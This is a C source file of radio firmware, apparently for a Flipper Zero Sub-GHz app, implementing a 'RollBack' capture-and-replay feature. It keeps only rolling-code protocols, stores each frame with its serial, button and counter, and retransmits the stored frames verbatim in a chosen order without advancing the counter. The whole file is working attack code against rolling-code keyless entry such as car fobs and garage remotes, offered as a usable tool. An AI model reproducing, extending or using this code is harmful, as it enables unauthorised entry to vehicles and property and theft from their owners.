#include "../subghz_i.h"
#include "subghz_txrx_i.h"
#include <lib/subghz/protocols/base.h>
#include <lib/toolbox/stream/stream.h>
#include <lib/flipper_format/flipper_format_i.h>
#include <string.h>

#define TAG "SubGhzRollback"

// Firmware glue for the RollBack rolling-code capture-then-replay feature.
// The pure slot math + field parsers live in subghz_rollback_core.c (host-tested);
// this file only bridges those to the live decoder / txrx radio path.

bool subghz_rollback_capture(SubGhz* subghz, SubGhzProtocolDecoderBase* decoder) {
    if(!decoder || !decoder->protocol) return false;
    if(decoder->protocol->type != SubGhzProtocolTypeDynamic) return false; // rolling only
    if(subghz->rollback_store.count >= ROLLBACK_MAX_SLOTS) return false;

    FuriString* text = furi_string_alloc();
    subghz_protocol_decoder_base_get_string(decoder, text);
    const char* t = furi_string_get_cstr(text);

    RollbackSlot s = {0};
    uint32_t fix = subghz_rollback_hex_after(t, "Fix:");
    s.serial = fix & 0x0FFFFFFF;
    s.btn = (uint8_t)((fix >> 28) & 0x0F);
    s.counter = subghz_rollback_hex_after(t, "Cnt:");
    s.decoded = (strstr(t, "MF:") != NULL) && (strstr(t, "MF:Unknown") == NULL) &&
                (strstr(t, "Cnt:????") == NULL);
    s.protocol_id = 1;

    // Serialize the frame VERBATIM (same bytes a saved .sub would hold) so replay
    // re-TXs the captured counter — no generation, no counter advance.
    SubGhzRadioPreset preset = subghz_txrx_get_preset(subghz->txrx);
    FlipperFormat* ff = flipper_format_string_alloc();
    bool ok =
        (subghz_protocol_decoder_base_serialize(decoder, ff, &preset) == SubGhzProtocolStatusOk);
    uint8_t next = subghz->rollback_store.count;
    if(ok) {
        Stream* st = flipper_format_get_raw_stream(ff);
        stream_rewind(st);
        size_t len = stream_read(
            st, (uint8_t*)subghz->rollback_frame[next], sizeof(subghz->rollback_frame[0]) - 1);
        subghz->rollback_frame[next][len] = '\0';
        ok = subghz_rollback_store_add(&subghz->rollback_store, &s); // append at [next]
    }
    flipper_format_free(ff);
    furi_string_free(text);
    return ok;
}

bool subghz_rollback_replay(
    SubGhz* subghz,
    RollbackOrder order,
    uint32_t delay_ms,
    volatile bool* abort) {
    uint32_t serial = 0;
    if(!subghz_rollback_ready(&subghz->rollback_store, &serial)) return false;
    uint8_t idx[ROLLBACK_MAX_SLOTS];
    uint8_t n = subghz_rollback_order_indices(
        &subghz->rollback_store, serial, order, idx, ROLLBACK_MAX_SLOTS);
    for(uint8_t i = 0; i < n; i++) {
        if(abort && *abort) break;
        FlipperFormat* ff = flipper_format_string_alloc();
        Stream* st = flipper_format_get_raw_stream(ff);
        stream_clean(st);
        stream_write_cstring(st, subghz->rollback_frame[idx[i]]);
        stream_rewind(st);
        if(subghz_txrx_tx_start(subghz->txrx, ff) == SubGhzTxRxStartTxStateOk) {
            furi_delay_ms(200); // transmit window: several packet repeats
        }
        subghz_txrx_stop(subghz->txrx);
        flipper_format_free(ff);
        if(i + 1 < n) furi_delay_ms(delay_ms); // inter-frame gap
    }
    return true;
}
